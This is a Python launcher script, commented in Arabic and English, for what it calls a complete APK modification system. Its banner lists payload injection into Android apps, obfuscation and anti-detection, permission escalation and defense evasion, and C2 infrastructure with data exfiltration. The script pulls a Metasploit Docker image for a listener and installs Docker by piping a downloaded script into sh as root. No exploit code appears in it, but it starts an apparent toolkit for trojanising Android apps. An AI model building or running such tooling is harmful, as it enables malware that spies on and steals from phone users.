#!/usr/bin/env python3
"""
Start script for the complete APK modification system
سكريبت بدء تشغيل النظام الكامل لتعديل APK

This script initializes and starts the complete system with all phases.
هذا السكريبت يهيئ ويبدأ النظام الكامل مع جميع المراحل.
"""

import os
import sys
import subprocess
from pathlib import Path


def is_root() -> bool:
    try:
        return os.geteuid() == 0
    except AttributeError:
        return False


def docker_available() -> bool:
    try:
        subprocess.check_output(["docker", "--version"], stderr=subprocess.STDOUT)
        return True
    except Exception:
        return False


def ensure_docker():
    if docker_available():
        return True
    if not is_root():
        return False
    try:
        print("🔧 تثبيت Docker تلقائياً (يتطلب root)...")
        subprocess.run(["bash", "-lc", "curl -fsSL https://get.docker.com | sh"], check=True)
        subprocess.run(["bash", "-lc", "systemctl enable --now docker"], check=False)
        return docker_available()
    except Exception:
        return False


def pull_msf_image():
    try:
        print("📦 سحب صورة Metasploit...")
        subprocess.run(["docker", "pull", "metasploitframework/metasploit-framework:latest"], check=False)
    except Exception:
        pass


def check_dependencies():
    """Check if all required dependencies are installed"""
    print("🔍 فحص التبعيات المطلوبة...")

    required_packages = [
        'fastapi', 'uvicorn', 'pydantic', 'aiofiles', 'aiohttp',
        'cryptography', 'pillow', 'requests', 'psutil'
    ]

    missing_packages = []

    for package in required_packages:
        try:
            __import__(package)
            print(f"  ✅ {package}")
        except ImportError:
            print(f"  ❌ {package}: غير مثبت")
            missing_packages.append(package)

    if missing_packages:
        print(f"\n⚠️ الحزم المفقودة: {missing_packages}")
        print("🔧 تثبيت التبعيات المطلوبة...")
        subprocess.run([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"]) 
    else:
        print("✅ جميع التبعيات متوفرة!")


def setup_directories():
    """Setup required directories"""
    print("\n📁 إعداد المجلدات المطلوبة...")

    required_dirs = [
        Path("/workspace/tasks"),
        Path("/workspace/uploads"), 
        Path("/workspace/temp"),
        Path("/workspace/logs")
    ]

    for dir_path in required_dirs:
        if not dir_path.exists():
            dir_path.mkdir(parents=True, exist_ok=True)
            print(f"  ✅ تم إنشاء {dir_path}")
        else:
            print(f"  ✅ {dir_path} موجود")


def start_server():
    """Start the FastAPI server"""
    print("\n🚀 بدء تشغيل الخادم...")
    print("🌐 الخادم سيعمل على: http://localhost:8000")
    print("📚 التوثيق متاح على: http://localhost:8000/docs")
    print("\n💡 لإيقاف الخادم اضغط Ctrl+C")

    # Auto-configure docker usage for listener
    use_docker = False
    if ensure_docker():
        pull_msf_image()
        use_docker = True
    env = os.environ.copy()
    if use_docker:
        env["ORCH_USE_DOCKER"] = "true"
        env["ORCH_DOCKER_IMAGE"] = env.get("ORCH_DOCKER_IMAGE", "metasploitframework/metasploit-framework:latest")
    try:
        subprocess.run([
            sys.executable, "-m", "uvicorn", 
            "app:app", 
            "--host", "0.0.0.0", 
            "--port", "8000",
            "--reload"
        ], env=env)
    except KeyboardInterrupt:
        print("\n👋 تم إيقاف الخادم")


def main():
    """Main startup function"""
    print("🎯 بدء تشغيل النظام الكامل لتعديل APK")
    print("=" * 60)
    print("📦 النظام يتضمن:")
    print("  • Phase 1: File Reception & Backend API")
    print("  • Phase 2: APK Analysis & Payload Injection")
    print("  • Phase 3: Advanced Obfuscation & Anti-Detection") 
    print("  • Phase 4: Permission Escalation & Defense Evasion")
    print("  • Phase 5: C2 Infrastructure & Data Exfiltration")
    print("  • Phase 6: Performance Optimization & Testing")
    print("=" * 60)

    # Check if we're in the right directory
    if not Path("app.py").exists():
        print("❌ خطأ: يجب تشغيل هذا السكريبت من مجلد orchestrator")
        sys.exit(1)

    try:
        check_dependencies()
        setup_directories()
        start_server()
    except Exception as e:
        print(f"❌ خطأ في بدء التشغيل: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()